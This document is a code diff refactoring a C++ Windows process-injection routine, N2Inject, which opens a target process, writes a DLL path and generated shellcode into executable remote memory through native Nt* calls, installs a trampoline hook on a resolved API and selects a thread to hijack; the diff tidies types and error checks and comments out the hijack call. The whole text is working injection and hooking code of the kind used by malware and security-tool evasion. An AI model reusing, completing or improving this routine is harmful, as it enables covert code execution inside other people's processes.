@@ -19,7 +19,7 @@ bool N2Inject(
         return false;
     }
 
-    string dllPath = N2ResolveDllPath(dllPathInput);
+    std::string dllPath = N2ResolveDllPath(dllPathInput);
     if (dllPath.empty()) {
         printf("Could not resolve DLL path for '%s'", dllPathInput);
         return false;
@@ -36,7 +36,9 @@ bool N2Inject(
         return false;
     }
 
-    UniqueHandle hProc(OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pid));
+    UniqueHandle hProc(OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
+        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
+        FALSE, pid));
     if (!hProc.valid()) {
         printf("OpenProcess(%u) failed: %lu", pid, GetLastError());
         return false;
@@ -53,68 +55,122 @@ bool N2Inject(
     PVOID hookAddr = reinterpret_cast<PVOID>(*hookAddrOpt);
     printf("Resolved %s!%s at %p\n", targetDll, targetApi, hookAddr);
 
-    array<byte, HOOK_SIZE> orig{};
-    ULONG bytesRead = 0;
+    // HOOK_SIZE should be pointer-sized. Prefer constexpr SIZE_T in your headers.
+    std::array<std::uint8_t, HOOK_SIZE> orig{};
+    SIZE_T bytesRead = 0;
+    SIZE_T toRead = orig.size();
 
-    NTSTATUS st = ab_call_fn_cpp<NTSTATUS>("NtReadVirtualMemory", hProc.get(), hookAddr, orig.data(), static_cast<ULONG>(orig.size()), &bytesRead);
-    if (!NT_SUCCESS(st) || bytesRead != HOOK_SIZE) {
-        printf("NtReadVirtualMemory failed: 0x%X read %lu\n", st, bytesRead);
+    NTSTATUS st = ab_call_fn_cpp<NTSTATUS>(
+        "NtReadVirtualMemory",
+        hProc.get(),
+        hookAddr,
+        orig.data(),
+        toRead,
+        &bytesRead);
+
+    if (!NT_SUCCESS(st) || bytesRead != orig.size()) {
+        printf("NtReadVirtualMemory failed: 0x%08X read %zu\n", static_cast<unsigned>(st), bytesRead);
         return false;
     }
 
-    printf("Read %lu bytes\n", bytesRead);
+    printf("Read %zu bytes\n", bytesRead);
 
+    // Allocate space for the DLL path
     PVOID remotePath = nullptr;
-    SIZE_T pathLen = dllPath.size() + 1;
+    SIZE_T pathLen = dllPath.size() + 1; // includes NUL
 
-    st = ab_call_fn_cpp<NTSTATUS>("NtAllocateVirtualMemory", hProc.get(), &remotePath, 0, &pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    st = ab_call_fn_cpp<NTSTATUS>(
+        "NtAllocateVirtualMemory",
+        hProc.get(),
+        &remotePath,
+        static_cast<ULONG_PTR>(0),
+        &pathLen,
+        static_cast<ULONG>(MEM_COMMIT | MEM_RESERVE),
+        static_cast<ULONG>(PAGE_READWRITE));
+
     if (!NT_SUCCESS(st) || !remotePath) {
-        printf("NtAllocateVirtualMemory(path) failed: 0x%X\n", st);
+        printf("NtAllocateVirtualMemory(path) failed: 0x%08X\n", static_cast<unsigned>(st));
         return false;
     }
 
-    st = ab_call_fn_cpp<NTSTATUS>("NtWriteVirtualMemory", hProc.get(), remotePath, const_cast<char*>(dllPath.c_str()), static_cast<ULONG>(pathLen), nullptr);
-    if (!NT_SUCCESS(st)) {
-        printf("NtWriteVirtualMemory(path) failed: 0x%X\n", st);
+    SIZE_T pathWritten = 0;
+    st = ab_call_fn_cpp<NTSTATUS>(
+        "NtWriteVirtualMemory",
+        hProc.get(),
+        remotePath,
+        const_cast<char*>(dllPath.c_str()),
+        pathLen,
+        &pathWritten);
+
+    if (!NT_SUCCESS(st) || pathWritten != pathLen) {
+        printf("NtWriteVirtualMemory(path) failed: 0x%08X wrote %zu of %zu\n",
+            static_cast<unsigned>(st), pathWritten, pathLen);
         return false;
     }
 
     printf("Wrote DLL path at %p\n", remotePath);
 
+    // Allocate shellcode region, prefer low memory if possible
     PVOID remoteCode = nullptr;
     SIZE_T codeSize = 1024;
 
-    PVOID lowBaseHint = (PVOID)0x10000000;
+    PVOID lowBaseHint = reinterpret_cast<PVOID>(0x10000000);
     SIZE_T lowHintSize = codeSize;
-    st = ab_call_fn_cpp<NTSTATUS>("NtAllocateVirtualMemory", hProc.get(), &remoteCode,
-        (ULONG_PTR)lowBaseHint, &lowHintSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-    if (!NT_SUCCESS(st) || !remoteCode || (uintptr_t)remoteCode >= 0x80000000) {
+    st = ab_call_fn_cpp<NTSTATUS>(
+        "NtAllocateVirtualMemory",
+        hProc.get(),
+        &remoteCode,
+        reinterpret_cast<ULONG_PTR>(lowBaseHint),
+        &lowHintSize,
+        static_cast<ULONG>(MEM_COMMIT | MEM_RESERVE),
+        static_cast<ULONG>(PAGE_EXECUTE_READWRITE));
+
+    if (!NT_SUCCESS(st) || !remoteCode || reinterpret_cast<std::uintptr_t>(remoteCode) >= 0x80000000u) {
         remoteCode = nullptr;
         codeSize = 1024;
-        st = ab_call_fn_cpp<NTSTATUS>("NtAllocateVirtualMemory", hProc.get(), &remoteCode, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        st = ab_call_fn_cpp<NTSTATUS>(
+            "NtAllocateVirtualMemory",
+            hProc.get(),
+            &remoteCode,
+            static_cast<ULONG_PTR>(0),
+            &codeSize,
+            static_cast<ULONG>(MEM_COMMIT | MEM_RESERVE),
+            static_cast<ULONG>(PAGE_EXECUTE_READWRITE));
     }
 
     if (!NT_SUCCESS(st) || !remoteCode) {
-        printf("NtAllocateVirtualMemory(code) failed: 0x%X\n", st);
+        printf("NtAllocateVirtualMemory(code) failed: 0x%08X\n", static_cast<unsigned>(st));
         return false;
     }
 
-    printf("Shellcode allocated at %p (%s low memory)\n", remoteCode,
-        (uintptr_t)remoteCode < 0x80000000 ? "OK" : "HIGH");
+    printf("Shellcode allocated at %p (%s low memory)\n",
+        remoteCode,
+        (reinterpret_cast<std::uintptr_t>(remoteCode) < 0x80000000u) ? "OK" : "HIGH");
 
-    vector<byte> shell = N2GenShell(hookAddr, remotePath, remoteCode, orig.data(), orig.size(), true);
+    std::vector<std::uint8_t> shell =
+        N2GenShell(hookAddr, remotePath, remoteCode, orig.data(), orig.size(), true);
 
-    st = ab_call_fn_cpp<NTSTATUS>("NtWriteVirtualMemory", hProc.get(), remoteCode, shell.data(), static_cast<ULONG>(shell.size()), nullptr);
-    if (!NT_SUCCESS(st)) {
-        printf("NtWriteVirtualMemory(code) failed: 0x%X\n", st);
+    SIZE_T scWritten = 0;
+    SIZE_T scSize = shell.size();
+    st = ab_call_fn_cpp<NTSTATUS>(
+        "NtWriteVirtualMemory",
+        hProc.get(),
+        remoteCode,
+        shell.data(),
+        scSize,
+        &scWritten);
+
+    if (!NT_SUCCESS(st) || scWritten != scSize) {
+        printf("NtWriteVirtualMemory(code) failed: 0x%08X wrote %zu of %zu\n",
+            static_cast<unsigned>(st), scWritten, scSize);
         return false;
     }
 
-    printf("Shellcode written (%zu bytes)\n", shell.size());
+    printf("Shellcode written (%zu bytes)\n", scSize);
 
     ULONG oldProt = 0;
-    if (!WriteTrampoline(hProc.get(), hookAddr, remoteCode, HOOK_SIZE, oldProt)) {
+    if (!WriteTrampoline(hProc.get(), hookAddr, remoteCode, static_cast<SIZE_T>(HOOK_SIZE), oldProt)) {
         printf("WriteTrampoline failed\n");
         return false;
     }
@@ -136,22 +192,31 @@ bool N2Inject(
     UniqueHandle hThreadHandle(hThread);
     printf("Selected thread %p for hijacking\n", hThread);
 
-    if (!N2ValidateRemoteExecution(hProc.get(), 0x0, reinterpret_cast<uintptr_t>(remoteCode), shell.size())) {
+    if (!N2ValidateRemoteExecution(hProc.get(), 0x0, reinterpret_cast<std::uintptr_t>(remoteCode), scSize)) {
         printf("Shellcode validation FAILED... aborting injection\n");
         return false;
     }
     printf("Shellcode environment validated OK\n\n");
 
+    /*
     try {
-        N2TeleportThreadExecutionLikeJagger(hProc.get(), hThreadHandle.get(), reinterpret_cast<uintptr_t>(remoteCode));
+        N2TeleportThreadExecutionLikeJagger(
+            hProc.get(),
+            hThreadHandle.get(),
+            reinterpret_cast<std::uintptr_t>(remoteCode));
         printf("Thread hijacked to execute at %p\n", remoteCode);
     }
-
-    catch (const std::exception& e) {
-        return false; // Literally just BS
+    catch (const std::exception&) {
+        return false;
     }
 
-    WaitForSingleObject(hThreadHandle.get(), 10000); // Crashes when closed... Why? Beyond me
+    // Wait for remote thread to finish some work. Avoid closing early.
+    DWORD wait = WaitForSingleObject(hThreadHandle.get(), 10000);
+    if (wait == WAIT_FAILED) {
+        printf("WaitForSingleObject failed: %lu\n", GetLastError());
+        return false;
+    }
+    */
 
     return true;
 }
